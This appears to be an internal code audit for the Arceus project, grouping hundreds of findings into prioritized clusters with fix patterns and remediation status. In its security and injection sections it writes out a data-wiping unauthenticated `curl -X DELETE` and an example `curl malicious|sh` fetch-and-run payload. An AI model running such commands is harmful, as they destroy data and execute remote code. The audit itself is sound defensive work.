# Arceus Code Audit — Compressed Clusters

**Source:** [flaws.md](./flaws.md) (458 line-level findings, F-001 → F-458)
**Goal of this doc:** group findings by shared root cause, tag priority, recommend one fix pattern per cluster.

---

## Status legend

- ✅ **closed** — all cited findings remediated, verified by gates
- 🟡 **partial** — most findings closed; specific deferrals listed inline
- 🔴 **open** — no remediation landed yet

## Priority board

| P | Cluster | Status | What breaks today | Scope |
|---|---|---|---|---|
| **P0** | [C1 · CAS disabled, silent lost writes](#c1--cas-disabled--silent-lost-writes) | 🟡 partial | Concurrent beats, two-writers races, lost mutations | Persistence + task + meeting + trust |
| **P0** | [C2 · Silent error swallowing](#c2--silent-error-swallowing) | 🟡 partial | State drifts from DB for minutes before detection | Persistence, heartbeats, audit, event-bridge |
| **P0** | [C3 · Fire-and-forget on critical paths](#c3--fire-and-forget-on-critical-paths) | 🟡 partial | Skill pipelines, trust updates, cross-sprint transfers silently vanish | Skills, sprints, heartbeats, hippocampus |
| **P0** | [C4 · Security — governance off + no auth](#c4--security--governance-off--no-auth) | 🟡 partial | Any network client can wipe/boot/halt the engine | Beat executor + all route files |
| **P0** | [C5 · RCE / injection vectors](#c5--rce--injection-vectors) | 🟡 partial | `shell: true`, skill content lint bypass, pgvector SQL compose, raw err.message | OpenCode, skill governance, hippocampus, routes |
| **P1** | [C6 · Module-level mutable state TOCTOUs](#c6--module-level-mutable-state-toctous) | 🟡 partial | Duplicate proposals, duplicate bridges, event-bridge flag stuck | 14+ module-level `let` vars |
| **P1** | [C7 · No AbortSignal / crash recovery](#c7--no-abortsignal--no-crash-recovery) | 🟡 partial | SIGTERM, hung LLMs, OpenCode child leaks, stranded beats | Everywhere |
| **P1** | [C8 · Non-atomic multi-step writes](#c8--non-atomic-multi-step-writes) | 🟡 partial | Cache vs DB divergence; partial sprints, orphan artifacts | Trust+task, meeting, sprint approve, artifact propagation |
| **P1** | [C9 · Unbounded memory growth](#c9--unbounded-memory-growth) | 🟡 partial | Server OOMs after N sprints | Artifacts array, audit ledger, activity log, graph store |
| **P1** | [C10 · O(n²) + no pagination](#c10-n-scans--no-pagination) | 🟡 partial | Latency spike as sprint size grows; payload blow-up | Task deps, checklist scans, list endpoints |
| **P1** | [C18 · Database layer (packages/db)](#c18--database-layer--packagesdb) | 🟡 partial | jsonb blob schema, missing FKs + indexes, migration races, pool discipline | `packages/db/*` |
| **P2** | [C11 · Stringly-typed roles/actions/phases](#c11--stringly-typed-rolesactionsphases) | 🟡 partial | Refactors silently drop roles; typos = bugs | ~80+ sites across 10+ files |
| **P2** | [C12 · Type-safety leaks (`as any`, `z.unknown()`)](#c12--type-safety-leaks) | ✅ closed | Runtime-only guarantees; schema drift | `request.body as {…}`, contracts events, roleTools |
| **P2** | [C13 · REST anti-patterns](#c13--rest-anti-patterns) | 🔴 open | Client SDKs cannot generically parse, no versioning, SSE buffer-overrun | routes/* surface |
| **P2** | [C14 · God files & god functions](#c14--god-files--god-functions) | 🔴 open | Hard to test, hard to refactor, hidden coupling | server, ceo, heartbeat, review, executor |
| **P2** | [C15 · Observability gaps](#c15--observability-gaps) | 🟡 partial | Debugging blind spots: truncations, console.log, no decision trail | All |
| **P3** | [C16 · Dead code / deprecated exports](#c16--dead-code--deprecated-exports) | 🟡 partial | Confuses readers, blocks refactors | ~15 sites |
| **P3** | [C17 · Magic constants](#c17--magic-constants) | 🔴 open | Tuning requires multi-site edits | ~40+ sites |

**Recommended fix sequence:** C2 → C1 → C4 → C5 → C3 (one-sprint P0 sweep), then C8 + C6 + C7 + C9 (one-sprint P1 sweep), then C11/C12 as umbrella refactors during normal feature work.

---

## Remediation log (chronological)

| Commit | Cluster | What landed |
|---|---|---|
| `26b43f3` | C2 | `swallowAndAudit` helper + 31 silent-catch sites migrated |
| `12199b1` | infra | mandatory ESLint + lint-staged + husky pre-commit + 2 CI jobs |
| `63d69cf` | C12 (prep) | auto-fix 198 stylistic violations across 142 files |
| `5f7afa6` | C2/C3/C16 | 70 floating/misused-promise sites + 29 catch-typing + most C16 cleared |
| `a0213ee` | C2/C3 | 14 bare `.catch(console.X)` → `swallowAndAudit` / `observability.logEvent` |
| `224f243` | **C4** | admin bearer-token gate on `/api/*` mutations + CORS allow-list + debug-route prod 404 |
| `99df907` | **C4** | `sanitizeError()` helper for `err.message` leaks (F-429) |
| `978de53` | **C12** | 286 `no-unsafe-*` sites → 0 in non-TUI/web (event-bridge typed, `(sprint as any)` removed, JSON imports) |
| `13c282b` | **C12** | F-397 `edge_added` GraphEvent variant; F-365/386 taskAction enums; F-426 Zod `request.body`; F-031 `cardData` discriminated union |
| `0520084` | C9 | F-045 artifacts ring buffer + F-391/F-392 pendingFlush cap + transitions/feedback log caps |
| `6259403` | **C8** | 6 read-modify-write helpers wrapped in `db.transaction()` (F-104/F-256/F-277); F-361 `commitScheduledMeeting` transactional dep; F-347 sprint tag-before-flip guard |
| `701ccc5` | **C7** | F-066 `proc.kill()` on opencode spawn timeout; F-212/F-233 stranded-run sweeper (boot + 5-min periodic) |
| `0c30f55` | **C6** | New `infra/gates.ts` (`TryRunGate` + `OncePromise`); F-273/F-274/F-290 `eventBridgeOnce` dedups concurrent SSE starts; F-043/F-315 `sprintCompletionGate` atomic re-entry guard; dead `ceoProposal*` triplet deleted |

### Cluster-by-cluster status

**C2 (silent error swallowing) — 🟡 partial**
- ✅ Closed: 31 sites via `swallowAndAudit` migration, 14 bare `.catch(console.X)` chains routed through observability error sink, ESLint `no-restricted-syntax` gate live, `scripts/check-no-silent-catch.ts` enforced in pre-commit.
- 🔴 Open: F-391/F-392 audit-ledger overflow handling beyond pendingFlush cap (full DB-failure recovery story); F-349 QA-parse fallback semantics; F-394 SSE subscriber cleanup audit pass; ~15 audit-cited `.catch(console.warn)` sites in deeper async chains.

**C3 (fire-and-forget critical paths) — 🟡 partial**
- ✅ Closed: 81 `no-floating-promises` + `no-misused-promises` sites across 18 files; ATA pipeline routed through `swallowAndAudit`; `recordCeoCardMeeting` awaited (F-319); `attachArtifactToTask` made async with real bug fix.
- 🔴 Open: no persistent job queue / DLQ infrastructure exists yet; F-273/F-274/F-290 `setEventBridgeStarted(true)` race; failures are now observable but not retryable.

**C4 (security — governance off + no auth) — 🟡 partial**
- ✅ Closed: F-424 admin bearer token on every mutating `/api/*` route; F-428 debug routes 404 in prod; F-438 approvals gated; F-450 CORS allow-list; F-429 `sanitizeError()` for client error responses.
- 🔴 Open: F-255/F-257 `GOVERNANCE_ENABLED = false` flip (deliberate deferral per user); web frontend Next.js Route Handler proxy still needs to inject admin token for `ARCEUS_REQUIRE_AUTH=1`.

**C6 (module-level mutable state TOCTOUs) — 🟡 partial**
- ✅ Closed: F-273/F-274/F-290 `eventBridgeStarted` race (replaced with `OncePromise` — first caller starts the SSE bridge, concurrent callers share the same promise, auto-clears on settle so failed starts retry); F-043/F-315 `sprintCompletionTriggered` race (`checkSprintCompletion` body now runs inside `TryRunGate.runExclusive`, atomic claim+release); F-315/F-319 `ceoProposalInFlight` (was dead state — three vars + setters + resets deleted, no callers existed). New `apps/api/src/infra/gates.ts` with 6 unit tests.
- 🔴 Open: F-305/F-306 `activeExecution` cleared before async work finishes (not a flag race — needs a context-passing refactor where downstream awaits receive `ExecutionContext` as a parameter instead of reading the global); F-204 `beatCounter` two-beats-same-id race (needs `Counter.incrementAndGet()` primitive); F-328 `agentSessions` Map mutated in place via `Object.assign` (pattern fix — "always replace, never mutate" — not a TOCTOU primitive).

**C7 (no AbortSignal / crash recovery) — 🟡 partial**
- ✅ Closed: F-066 opencode child SIGTERM/SIGKILL on spawn timeout + spawn error (no more orphan processes across deploys); F-212/F-233 stranded-run sweeper (boot pass with 0ms threshold + periodic 5-min sweep at 30-min stall threshold; uses pre-existing `findStrandedRuns` / `markStranded` repo helpers and the partial index that was already in the schema); F-302 reconnect backoff already in place (exponential + jitter + reset-on-success).
- 🟡 Partial: F-395/F-348 `runPromptText` / `structuredCompletion` have request-level `AbortSignal.timeout(REQUEST_TIMEOUT)`, but no caller-passed signal — SIGTERM can't cancel a 5-min LLM call mid-flight; F-292 `detectExistingOpencodeServer` has a 2s AbortController, `startEventBridge` fetch does not.
- 🔴 Open: F-247/F-262/F-307 (no AbortSignal threaded through checklist → executor → execution-cycle chain); F-293 (SSE `reader.read()` infinite loop has no `reader.cancel()` on shutdown).

**C8 (non-atomic multi-step writes) — 🟡 partial**
- ✅ Closed: F-104/F-256 read-modify-write atomicity (6 `updateX` helpers wrapped in `db.transaction()`); F-277 meeting contributions atomic on the persistence side; F-347 sprint completion blocks status flip until tagSprint succeeds; F-361 scheduler fires meeting + advances schedule via single `commitScheduledMeeting` transaction.
- 🔴 Open: F-305 `setActiveExecution(null)` TOCTOU (re-classified as C6 — module-level state, not a DB write); F-364 ensure-daily-sync race (needs unique constraint `(company_id, type, date)` + INSERT…ON CONFLICT — separate migration); F-350 sprint approval (createSprint + N×createTask + updateSprint atomicity needs persistSprint/persistTask refactor to accept tx parameter).

**C9 (unbounded memory growth) — 🟡 partial**
- ✅ Closed: F-045 `artifacts[]` ring buffer (`MAX_RECENT_ARTIFACTS=500`); F-391/F-392 `pendingFlush` cap (`MAX_PENDING_FLUSH=10_000`) with drop-oldest counter; transitionsLog/feedbackRoundsLog capped at 500; F-394/F-398 already capped pre-audit (activity log 2000 + SSE close cleanup); F-361 priming `recentEvents` already capped (slice(0, 5)).
- 🔴 Open: F-393 graph store retention + 11 node-collection caps; F-417 pgvector `list()` cursor pagination (3 store impls + 4 service callers).

**C12 (type-safety leaks) — ✅ closed**
- All cited findings remediated: F-426 `request.body as { ... }` Zod-parsed in 7 routes; F-257 `(roleTools as any)` cleared; F-433/F-453 `body.role/kind as any` subsumed by F-426; F-031 `cardData` discriminated union (other freeform `z.record` uses documented as intentional); F-397 `edge_added` GraphEvent variant; F-365/F-386 taskAction enums; F-296/F-297 OpenCodeEvent typed.
- Net: 286 `no-unsafe-*` sites → 0 in non-TUI/web. ESLint surface 1016 → 737.

**C15 (observability gaps) — 🟡 partial**
- ✅ Closed: pendingFlush counter exposed via `/api/audit/status`; `sanitizeError()` includes `correlationId` for client/server log joining.
- 🔴 Open: ~30 `console.log/warn/error` sites in prod paths (F-037/F-237/F-323/F-343/F-402); truncations without `…` markers (F-094 family); checklist decision audit trail (F-248); SSE keepalive heartbeats; `X-Request-Id` on every error response.

**C16 (dead code / deprecated) — 🟡 partial**
- ✅ Closed: 37/49 deprecated callsites; 33 pgTable schemas migrated to array form; `runPatternPromotionSweep` route migrated to `runCrossSprintTransfer`; `z.string().url()` → `z.url()`.
- 🔴 Open: 12 `trustScoresTable` callsites (intentional — Spec 31b deferred migration; legacy text-PK score model coexists with canonical role_trust band model).

**C18 (database layer) — 🟡 partial**
- ✅ Closed: drift test gates schema vs canonical agreement (5/5 pass); migration runner via canonical schema definitions; pgTable signature migrated.
- 🔴 Open: F-174 jsonb-blob extraction (the big one — `company_states.snapshot_data` still holds tasks/sprints/meetings inline); FK + index pass; `pg_advisory_lock` migration discipline; atomic counter updates.

---

## P0 — Stop the bleeding

### C1 · CAS disabled, silent lost writes

**Root cause:** `cpApplyMutations` was switched to last-write-wins (F-086). Every write path on top of it inherits the gap — concurrent beats, concurrent route traffic, concurrent meeting contributions all race with no version check.

| Where | Surface | Flaw IDs |
|---|---|---|
| [control-plane.ts](apps/api/src/persistence/control-plane.ts) — `cpApplyMutations` | Master mutation lane | F-086, F-088 |
| [mutations.ts](apps/api/src/tasks/mutations.ts) | Task status + artifact propagation | F-215, F-216, F-258, F-281, F-374 |
| [review.ts](apps/api/src/sprints/review.ts) — `updateSprint` | Dual reviewState writes race | F-345, F-346 |
| [proposals.ts](apps/api/src/sprints/proposals.ts) — `approveSprintProposal` | Task creation loop, no tx | F-350 |
| [meeting-pipeline.ts](packages/company-runtime/src/meeting-pipeline.ts) — `updateMeeting` | Full-object overwrite on status transition | F-277, F-359 |
| [meeting-scheduler.ts](packages/company-runtime/src/meeting-scheduler.ts) | Skip-count, total-runs, upsert+schedule pair | F-351 (cluster), F-361 |
| [lifecycle.ts](apps/api/src/sprints/lifecycle.ts) — `finalizeSprintCompletion` | Write + `tagSprint` + persist non-atomic | F-347 |

**Why it matters:** two heartbeats for the same task both flip to `in_progress`; two agents contributing to a meeting lose a write; review phase oscillates because handlers race. This is the single biggest class of bug in the codebase.

**Fix pattern (revised, see [Spec 33](../specs/33-cas-concurrency-protection.md)):** Paperclip uses **zero version columns**. Three primitives instead:

- **Pattern A — `SELECT … FOR UPDATE` row lock** at the top of read-modify-write transactions
- **Pattern B — `UPDATE … WHERE id = ? AND status = expectedFrom`** for status transitions (illegal prior state ⇒ zero rows ⇒ caller decides)
- **Atomic SQL counters** — `SET col = col + 1` with no read-modify-write window

The audit's original "use Paperclip's `issues.ts:1779-1851`" reference was a misread — that range is a child-issue lister, not a CAS site. Paperclip's actual pattern lives at `services/issues.ts:1202` (`syncBlockedByIssueIds`) and `:1329` (`clearExecutionRunIfTerminal`).

**Status:**
- ✅ **Phase 1** — task claim CAS — already shipped pre-audit (`packages/db/src/repos/tasks.ts:claimTask`).
- ✅ **Phase 2** — Pattern A row locks across 7 repos (`tasks`, `sprints`, `meetings`, `meeting_schedules`, `approvals`, `companies`, `memory_summaries`); wired into all `update*` helpers in `apps/api/src/persistence/mutations.ts`. Closes F-104, F-256, F-215, F-216, F-345, F-346, F-277, F-359 lost-update gaps.
- ✅ **Phase 3** — `meetingsRepo.transitionStatus` + `meeting-pipeline.ts` swap. 5 status flips now atomic with prior-state guard; completion flip keeps Phase 2 lock + inline assertion.
- ✅ **Phase 4** — `meetingSchedulesRepo.incrementCounter` + `markSkipped` (atomic skip+timestamps); scheduler skip path swapped.
- 🟡 **Open:** `proposals.ts approveSprintProposal` task-creation loop (F-350) and `lifecycle.ts finalizeSprintCompletion` (F-347) still need transaction-boundary review (these are multi-table, not single-row, so Pattern A doesn't directly apply).

Tests: `packages/db/src/repos/locks.test.ts` — 10 concurrency tests (Pattern A serialization, Pattern B status guard, atomic counters), all passing against live Postgres.

---

### C2 · Silent error swallowing

**Root cause:** ~40 call sites swallow errors with `.catch(() => {})`, `.catch(() => undefined)`, `catch {}`, or `catch(logger.warn)`. In aggregate this means any transient DB, network, or LLM failure disappears without a trace.

| Severity | Call site | Consequence | Flaw IDs |
|---|---|---|---|
| 🔴 | [company-state.ts](apps/api/src/persistence/company-state.ts) — `persistQueue.catch(() => undefined)` × 4 | Every state mutation during a Postgres outage lost silently | F-068 umbrella |
| 🔴 | [audit-ledger.ts](apps/api/src/observability/audit-ledger.ts:94-106) | After `MAX_DB_FAILURES`, `pendingFlush` is cleared | F-391, F-392 |
| 🔴 | [heartbeat.ts](packages/company-runtime/src/heartbeat.ts) — `commitBeatRecord` swallow | Beat audit trail dropped | F-112, F-217 |
| 🔴 | [event-bridge.ts](apps/api/src/heartbeats/event-bridge.ts:62) — `void processEvent(...)` | Every SSE frame's async rejection dropped | F-289, F-290 |
| 🔴 | [chat.ts](apps/api/src/agents/chat.ts:225-231) | `emitBeatEvent` swallow breaks heartbeat chain | F-316 |
| 🟠 | [beat-executor.ts](apps/api/src/heartbeats/beat-executor.ts) — 5 empty catches | Trust updates, session destroy, preview, bridge — all silent | F-260 |
| 🟠 | [sprints/review.ts:300-302](apps/api/src/sprints/review.ts) | QA-parse failure → `qaReport = null` = "tool failed" (misclassifies real defects) | F-349 |
| 🟠 | [lifecycle.ts:199-202](apps/api/src/sprints/lifecycle.ts) | `tagSprint` fails — sprint completes with incomplete bundle | F-347 |
| 🟠 | Skills pipeline — `runATAPipeline(...).catch(console.warn)` × 4 | Long-running skill proposals abandoned without DLQ | F-331, F-279 |
| 🟠 | [activity.ts:72-75](apps/api/src/observability/activity.ts) | SSE write fails — subscriber never cleaned up | F-394 |
| 🟠 | [hippocampus/service.ts](packages/hippocampus/src/service.ts) — `embed() catch → insert without vector` × 4 | Ghost rows with null embeddings become invisible to search | F-409 |

**Why it matters:** operators see a healthy-looking server with diverging DB state, phantom memories, broken audit trails. "Why didn't this work?" becomes unanswerable.

**Fix pattern:** a single `swallowAndAudit(kind, fn)` helper that emits an audit entry on every caught error. No bare `.catch(() => {})` anywhere. Mandatory ESLint rule.

---

### C3 · Fire-and-forget on critical paths

**Root cause:** long-running pipelines and side-effect writes are dispatched with `void promise` or unused promise results. No outbox, no job queue, no way to retry.

| Pipeline | Site | Flaw IDs |
|---|---|---|
| Cross-sprint skill transfer | [lifecycle.ts:162](apps/api/src/sprints/lifecycle.ts), [sprint-lifecycle.ts:248-255](packages/task-engine/src/sprint-lifecycle.ts) | F-377 |
| ATA pipeline (all 3 entry points) | [cross-sprint.ts:59](apps/api/src/skills/cross-sprint.ts), [checklist-executor.ts:304,351](apps/api/src/heartbeats/checklist-executor.ts), [skills.routes.ts:233](apps/api/src/routes/skills.routes.ts) | F-279, F-331 |
| Trust-score + policy-violation writes in event bridge | [event-bridge.ts:177,185](apps/api/src/heartbeats/event-bridge.ts) | F-291 |
| Hippocampus `processTaskCompletion` | [mutations.ts:304-413](apps/api/src/tasks/mutations.ts) | F-375 |
| Meeting pipeline ticks | [meeting-scheduler.ts:162-165,339,399](packages/company-runtime/src/meeting-scheduler.ts) | F-283, F-360 |
| `recordCeoCardMeeting` not awaited | [chat.ts:188](apps/api/src/agents/chat.ts) | F-319 |
| `setEventBridgeStarted(true)` before connect resolves | [beat-executor.ts:49](apps/api/src/heartbeats/beat-executor.ts), [checklist-executor.ts:55](apps/api/src/heartbeats/checklist-executor.ts), [event-bridge.ts:73](apps/api/src/heartbeats/event-bridge.ts) | F-273, F-274, F-290 |

**Why it matters:** an `.catch(console.warn)` on a 30-minute skill-test pipeline is unrecoverable — the work is gone and the caller moved on. Combined with C2, the user sees "skill proposed" but nothing ever happens.

**Fix pattern:** every fire-and-forget becomes either `await` (and the caller propagates) or an enqueue onto a persistent job queue with retry metadata. Drain via a durable worker.

---

### C4 · Security — governance off + no auth

**Root cause:** the governance framework is fully built and hardcoded-OFF; the HTTP surface has no authentication at all.

| Layer | Issue | Flaw IDs |
|---|---|---|
| Beat executor | `GOVERNANCE_ENABLED = false` — trust-based tool filtering is theater | F-255, F-257 |
| `POST /api/quick-execute` | Network-reachable full bootstrap + engine start, zero auth | F-424 |
| `DELETE /api/company` | Wipes a company, zero auth | F-424 |
| `POST /api/heartbeat/*` | Start/stop/trigger/configure engine, zero auth | F-424 |
| `POST /api/strategy/*`, `/api/board-review/approve`, `/api/approvals/:id/resolve` | Approvals accept any role identity, no signing | F-424, F-438 |
| `/api/debug/*`, `/api/hippocampus/seed`, `/api/skills/simulate-task-outcome`, `/api/governance/check` | Debug/seed/simulate endpoints mounted unconditionally in prod | F-428 |
| SSE endpoints | `Access-Control-Allow-Origin: <request.origin>` + `Allow-Credentials: true` — any origin can read agent activity | F-450 |
| Error responses | `err.message` leaked directly to client (DB strings, stack hints, file paths) | F-429 |

**Why it matters:** a single `curl -X DELETE https://arceus.example.com/api/company` resets production.

**Fix pattern:** install `@fastify/auth` + `@fastify/rate-limit`, add a `preHandler` guard on every non-read route, flip `GOVERNANCE_ENABLED = true`, gate `/api/debug/*` behind `NODE_ENV !== "production"` and an admin token, install `@fastify/cors` with an origin allow-list.

---

### C5 · RCE / injection vectors

**Root cause:** several privilege-escalation paths that only luck has kept out of prod.

| Vector | Where | Flaw IDs | Status |
|---|---|---|---|
| `spawn(..., { shell: true })` | [opencode.ts](apps/api/src/infra/opencode.ts) | F-063 | ✅ closed — POSIX uses `shell: false`; Windows-only conditional retained for `.cmd` shim resolution |
| `npm run build` / child scripts pass user-controllable env | [opencode.ts](apps/api/src/infra/opencode.ts) / workspace manager | F-087 | 🔴 open |
| Skill-content shell lint patterns are incomplete | [governance.ts:44-54](apps/api/src/skills/governance.ts) — incomplete regexes miss Unicode homoglyphs, double-escaped backticks, `bash -c "curl\|sh"` in prose | F-330 | 🔴 open |
| Habit-ID SQL composition via `sql.join()` + template strings | [pgvector.ts:389-401](packages/hippocampus/src/backends/pgvector.ts) | F-406 | 🔴 open |
| User-controlled strings concatenated into system prompts raw | [ceo.ts:374-395](apps/api/src/agents/ceo.ts), [developer.ts](apps/api/src/prompts/developer.ts), [specialist.ts](apps/api/src/prompts/specialist.ts) | F-318 (+ cluster) | 🔴 open |
| Raw `err.message` back to client | Route layer (10+ handlers) | F-429 | ✅ closed (commit `99df907` — `sanitizeError()` helper) |
| Other `shell: true` sites (preview.ts, control-plane.ts, verification-gate.ts, workspaces.routes.ts) | 4 sites | (not in F-063 audit, but related) | 🔴 open — workspace command spawn (preview.ts) is by-design "run user's code"; the other 3 are mechanical argv refactors |

**Why it matters:** approved skill runs shell. Lint misses one pattern. LLM suggests `$(curl malicious|sh)` inside a proposed skill; governance signs off; bash executes. Dead end.

**Fix pattern:** move away from `shell: true`; use `spawn(argv, { shell: false })` everywhere. Expand lint into a parsed-AST shell validator (or require explicit `Skill.allowedCommands`). Parameterize all pgvector queries. Sanitize prompt injection via a templating layer with clear escape semantics.

---

## P1 — Reliability & stability

### C6 · Module-level mutable state TOCTOUs

**Root cause:** 14+ `export let` booleans + Maps in [orchestration/state.ts](apps/api/src/orchestration/state.ts) read-and-written across beat-executor, event-bridge, chat, proposals, specialist-executor. Node is single-threaded but async interleaving creates classic check-then-set races.

| Flag / collection | Race consequence | Flaw IDs |
|---|---|---|
| `eventBridgeStarted` | Two beats both start a bridge, or one fails and flag stuck true | F-273, F-274, F-290 |
| `ceoProposalInFlight` | Duplicate proposal if chat + heartbeat interleave | F-315, F-319 |
| `activeExecution` | Cleared before async work finishes → orphaned tasks | F-305, F-306 |
| `beatCounter` | Two beats get the same id under load | F-204 |
| `developerStepLoopActive` / `sprintCompletionTriggered` | Step-loop flags checked without atomicity | F-043, F-315 |
| `agentSessions: Map` | Mutated in place via `Object.assign` | F-328 |

**Fix pattern:** wrap each flag family in a small class with an explicit lock / CAS method, or use `Semaphore` from heartbeat.ts consistently. See F-043 umbrella.

---

### C7 · No AbortSignal / no crash recovery

**Root cause:** no `AbortSignal` is threaded through any of the long-running code paths. Shutdown cannot interrupt in-flight LLM calls, SSE readers, or child processes. No stranded-beat sweeper (Paperclip parity gap, F-212).

| Path | Missing | Flaw IDs |
|---|---|---|
| `runPromptText` / `structuredCompletion` | No timeout or signal | F-395, F-348 |
| Checklist + executor + orchestration/execution-cycle | Chain of awaits with no cancel path | F-247, F-262, F-307 |
| SSE `reader.read()` infinite loop | No cancel path | F-293 |
| OpenCode `fetch(/event)` initial connect | No timeout | F-292 |
| OpenCode child-process spawn timeout | Rejects without `proc.kill()` — orphan `opencode serve` processes | F-066 |
| Event-bridge reconnect | Fixed 3s delay, no backoff/jitter, infinite retries | F-302 |
| Heartbeat engine — no stranded-run reconciliation | PID-dead beats stay `running` forever | F-212, F-233 |

**Fix pattern:** accept `signal: AbortSignal` at every entry point; propagate; honor in `await reader.read()` and `fetch`. Install a per-process Paperclip-style stranded-beat sweeper. Give every retry loop exponential backoff + jitter + max-attempts.

---

### C8 · Non-atomic multi-step writes

**Root cause:** writes that must land together land separately. Cache and DB drift.

| Flow | Split | Flaw IDs |
|---|---|---|
| Task status + trust-event + audit | `setTaskStatus` + `cpUpdateTrustScore` + `audit` — three separate writes | F-104, F-256 |
| Sprint approval | `createSprint` + N× `createTask` + `updateSprint` | F-350 |
| Meeting pipeline | `upsertMeeting` + `updateMeetingSchedule` | F-361 |
| Meeting contributions | `updateMeeting(m ⇒ ...)` spread, no version | F-277 |
| `setActiveExecution(null)` before awaits finish | Orchestrator executes on null state | F-305 |
| Ensure-daily-sync race | Read `hasDailySync` → create (two ticks both create) | F-364 |
| Sprint-tagSprint + snapshot row | Tag succeeds, snapshot row fails (or vice versa) | F-347 |

**Fix pattern:** every logical operation is a single `StateMutation` applied atomically via a transactional `applyMutations` (see F-088/F-215 pattern).

---

### C9 · Unbounded memory growth

**Root cause:** in-memory structures never trim.

| Structure | Growth | Flaw IDs |
|---|---|---|
| `artifacts[]` (orchestration/state) | Every `addArtifact` pushes, never trimmed | F-045 family |
| Audit ledger `pendingFlush[]` | Appends per `audit()` | F-392, F-391 |
| Activity ring buffer (fixed 2000) vs actual usage | No eviction policy once subscribers drop | F-394, F-398 |
| Graph store nodes/edges | Appends per sprint/beat, never capped | F-393 |
| Pgvector `list()` hardcoded limit 50 | Not pagination — silent truncation after 50 | F-417 |
| `recentEvents` array in priming state | Not pruned | F-361 (hippo variant) |

**Fix pattern:** ring buffer with a hard cap everywhere; persistent ledger goes to DB; pagination (cursor) on every collection query.

---

### C10 · O(n²) scans + no pagination

**Root cause:** repeated linear `.find()` inside `.filter()`, repeated `getSnapshot()` per function, no pre-indexing on snapshot construction; every list endpoint returns the whole array.

| Site | Cost | Flaw IDs | Status |
|---|---|---|---|
| Task-dep lookups — `tasks.filter(id ⇒ tasks.find(id))` twice | O(n²) per beat | F-198, F-298, F-324, F-378 | 🔴 deferred (perf-only, scale-dependent) |
| Checklist — 14 `ctx.tasks.filter(...)` per developer beat | Repeated scans | F-245 | 🔴 deferred |
| `setTaskStatus` — 3-5 `getSnapshot()` calls per call | Redundant snapshot builds | F-385 | 🔴 bundled with C14 PR 10 (mutations.ts split) |
| Skill registry — `getAllSkills` full-scans per health check; rebuild `activeSkillIndex` on every register | O(n²) on writes | F-336, F-337 | 🔴 deferred |
| Event-bridge per-event policy load | N+1 DB queries on high-volume streams | F-294 | 🔴 deferred |
| Pgvector `cosineDistance` without index hint | Full table scan on every retrieval | F-411 | ✅ **incorrectly classified — index existed from migration 0000.** Verified pgvector 0.8.2 + `memory_embeddings_embedding_idx` (ivfflat, vector_cosine_ops, lists=100) on local DB. |
| List routes — 16 endpoints return unbounded arrays | Large payloads + clients force-cache | F-432 | 🟠 **carve-out: ship hard cap now** (cursor pagination defer) |

**Fix pattern:** pre-index on `AgentBeatContext` construction (`byStatus`, `byId`, `byAssignee`); pass precomputed indexes into checks; cursor-paginate every list route with a 500 hard cap.

**Ship-now carve-out (rest defer until scale demands):**
- F-432 (partial): global `HARD_LIST_CAP = 500` middleware on all 16 list endpoints. Prevents accidental DoS / payload bloat without a full cursor-pagination refactor.

---

### C18 · Database layer — `packages/db`

**Scope:** the Drizzle + Postgres layer (`packages/db/src/*`), migrations, indexes, connection pool, and the specific schema decisions that determine whether the system can grow. Not app-level persistence logic (that's in `store.ts` / `control-plane.ts` and mostly shows up in C1 and C8).

Five DB-specific concerns:

**1. jsonb-blob schema (`snapshot_data` holds everything)**
`company_states.snapshot_data` is a single jsonb column containing tasks, sprints, meetings, agents, memories. Consequences at the DB level:
- Can't index into inner fields → every query is a full-blob read
- Can't migrate inner structure → schema changes require a backfill over every row
- Can't grant row-level permissions → RLS is impossible
- Every write is `UPDATE … SET snapshot_data = $full_blob` → no delta writes, no partial index updates
- Contention hotspot → one company = one row = one lock
**Flaws:** F-174 (umbrella — extract to relational tables), F-172, F-199.

**2. Schema drift between Drizzle schema and application reads**
Drizzle schema in `packages/db/src/schema/*.ts` doesn't match what runtime writes. Runtime reaches for fields the schema doesn't declare, via `as any` on the app side. The DB ends up storing fields the Drizzle types don't know about.
**Flaws:** F-173 (schema + app drift umbrella), plus every `(x as any).field` in app code traces to here.

**3. Missing indexes + query-plan hygiene**
| Column / predicate | Current plan | Flaw |
|---|---|---|
| `skills.company_id` | Seq Scan | F-336 |
| `memory_facts.embedding` (pgvector cosine) | Full scan, no HNSW/IVFFlat | F-411 |
| `trust_scores.agent_id` on frequent lookups | Index exists; verify | F-118 (implied) |
| `heartbeat_runs.status = 'running'` (stranded-run sweeper) | Partial index missing | F-212 |
| `habit_ids` in composed `WHERE id IN (...)` string SQL | Not parameterized — see C5 | F-406 |

**4. FK + constraint discipline**
- Dangling references: bootstrap writes a `strategyId` that no row in `strategies` matches (F-143). The DB doesn't enforce the FK because the FK isn't declared.
- jsonb-blob approach makes FK enforcement impossible for anything inside the blob (tasks.assignedRole → agents.id can't be enforced).
- `ON DELETE` behavior inconsistent — some tables cascade, some orphan.
**Flaws:** F-143, F-174 (extraction required for proper FKs).

**5. Connection pool + migration discipline**
- `DATABASE_URL` validation at boot (missing in some entry points)
- `postgres.js` pool sized ad-hoc, no circuit breaker on DB errors
- Migrations run via `applyMigrations()` on startup with no lock — two instances racing on deploy both apply
- No `--target` flag; migrations go all-or-nothing
- No separation of schema-change migrations from data-backfill migrations (mixing DDL and DML in one migration is the SQL anti-pattern the [database-migrations skill](../../skills/database-migrations) flags explicitly)
**Flaws:** F-191 through F-200 cluster.

**Why it matters:** the DB is the durability layer. When its schema is a jsonb blob, queries can't be optimized. When indexes are missing, `EXPLAIN` shows Seq Scan on every frequent path. When FKs aren't declared, integrity is a hope. When migrations lack a lock, two pods deploy and one's `ALTER TABLE` races another's `CREATE INDEX`. These failures are invisible at 10 rows and catastrophic at 10M.

**Fix pattern (ordered):**
1. **Extract the jsonb blob (F-174).** One entity at a time — tasks first (highest write volume), then sprints, meetings, agents. Dual-write during transition, cut over once reads are migrated.
2. **Declare every FK + index in one migration.** Include the C10 indexes (F-198, F-336, F-411). Use `CREATE INDEX CONCURRENTLY` on tables with traffic.
3. **Lock migrations with `pg_advisory_lock`** before running; second instance no-ops.
4. **Reconcile Drizzle schema with Zod contracts.** They must reference the same enums and the same field sets.
5. **Atomic counter updates** — `totalCostCents = totalCostCents + $delta` in SQL, not in app code that read-modify-writes.

This is the largest single refactor in the audit — ~2 weeks of focused DB work — but it unblocks everything downstream (atomic mutations, proper indexes, real FKs, per-entity permissions). Without it, C1 and C8 fixes sit on top of the jsonb blob and never quite work.

**Cluster relationships:**
- C1 (CAS) sits on *top* of this layer — CAS needs a `version` column, which needs real tables, which needs F-174
